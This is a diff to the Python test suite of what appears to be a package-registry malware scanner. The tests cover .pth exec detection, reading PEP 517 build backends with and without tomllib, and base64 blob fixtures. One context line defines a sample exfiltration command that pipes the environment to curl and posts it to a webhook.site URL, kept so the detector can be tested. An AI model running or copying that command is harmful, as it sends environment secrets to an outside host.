@@ -21,7 +21,7 @@ from unittest import mock
 
 from lazaret.registry import repo
 from tests.registry._review_support import (
-    DECODE_EXEC_JS, DECODE_EXEC_PY, ELF, EXFIL_JS, hooks, issues, manifest, scan_npm,
+    B64_DATA, DECODE_EXEC_JS, DECODE_EXEC_PY, ELF, EXFIL_JS, hooks, issues, manifest, scan_npm,
     scan_sdist, scan_wheel)
 
 SH_EXFIL = "env | curl -s -X POST --data-binary @- https://webhook.site/0000-example\n"
@@ -45,8 +45,9 @@ class PthTests(unittest.TestCase):
         self.assertEqual(res["verdict"], "OK")
 
     def test_pth_issues_helper(self):
-        found = repo.pth_issues("a.pth", "import sys\nlib\nimport os;exec('x')\n")
-        self.assertEqual([(i["line"], i["sev"]) for i in found], [(1, "MAJOR"), (3, "CRITICAL")])
+        # (exec of a plain literal is judged by the literal's code: 'x' runs nothing risky)
+        found = repo.pth_issues("a.pth", "import sys\nlib\nimport os;exec(s)\nimport os;exec('x')\n")
+        self.assertEqual([(i["line"], i["sev"]) for i in found], [(1, "MAJOR"), (3, "CRITICAL"), (4, "MAJOR")])
 
 
 class EntryPointTests(unittest.TestCase):
@@ -125,18 +126,39 @@ class PythonInstallScriptTests(unittest.TestCase):
         self.assertEqual({i["file"] for i in issues(res, "SC-INSTALL-HOOK")}, {"_build/backend.py"})
 
     def test_pep517_reader_without_tomllib(self):
+        # (Python 3.10 has no tomllib: the SCA's subset reader reads the TOML forms pip reads, where a regex alone
+        # missed six of seven: BR-1)
+        from lazaret.scanner import sca
         text = ('[project]\nname = "x"\n[build-system]\nbuild-backend = "pkg.api:backend"\n'
                 'backend-path = [\n  "_b",\n  "src",\n]\n[tool.x]\ny = 1\n')
-        self.assertEqual(repo._pep517_backend(text), ("pkg.api:backend", ["_b", "src"]))
-        import builtins
-        real_import = builtins.__import__
+        forms = {
+            "plain": text,
+            "a comment after the header": '[build-system]  # tools\nbuild-backend = "pkg.api:backend"\n'
+                                          'backend-path = ["_b", "src"]\n',
+            "dotted keys": 'build-system.build-backend = "pkg.api:backend"\nbuild-system.backend-path = ["_b", "src"]\n',
+            "an inline table": 'build-system = { build-backend = "pkg.api:backend", backend-path = ["_b", "src"] }\n',
+            "quoted keys": '[build-system]\n"build-backend" = "pkg.api:backend"\n"backend-path" = ["_b", "src"]\n',
+            "an escape": '[build-system]\nbuild-backend = "pkg.\\u0061pi:backend"\nbackend-path = ["_b", "src"]\n',
+            "a decoy in a string": ('x = """\n[build-system]\nbuild-backend = "decoy"\nbackend-path = ["d"]\n"""\n'
+                                    '[build-system]\nbuild-backend = "pkg.api:backend"\nbackend-path = ["_b", "src"]\n'),
+        }
+        import importlib
+        real = importlib.import_module
 
-        def no_tomllib(name, *a, **kw):
+        def no_tomllib(name, *args, **kw):
             if name == "tomllib":
                 raise ImportError(name)
-            return real_import(name, *a, **kw)
-        with mock.patch("builtins.__import__", no_tomllib):
-            self.assertEqual(repo._pep517_backend(text), ("pkg.api:backend", ["_b", "src"]))
+            return real(name, *args, **kw)
+        for tomllib in (True, False):
+            patch = (mock.patch.object(sca, "_tomllib", wraps=sca._tomllib) if tomllib
+                     else mock.patch.object(importlib, "import_module", side_effect=no_tomllib))
+            with patch:
+                for form, toml in forms.items():
+                    with self.subTest(tomllib=tomllib, form=form):
+                        self.assertEqual(repo._pep517_backend(toml), ("pkg.api:backend", ["_b", "src"]))
+        # (a text no TOML reader reads: the narrow regex reader, as before)
+        self.assertEqual(repo._pep517_backend('[build-system]\nbuild-backend = "a.b"\nbackend-path = ["x"]\n= broken\n'),
+                         ("a.b", ["x"]))
 
     def test_python_network_and_secret_patterns(self):
         self.assertTrue(repo.install_script_risk(self.ENV_TO_HOST))
@@ -166,7 +188,7 @@ class ShellRiskPrecisionTests(unittest.TestCase):
 
 
 class TestPathTests(unittest.TestCase):
-    BLOB = "const p = '" + "QUJD" * 150 + "';\n"
+    BLOB = "const p = '" + B64_DATA + "';\n"
 
     def package(self, d):
         return {"package.json": json.dumps({"name": "x", "main": f"{d}/index.js"}),
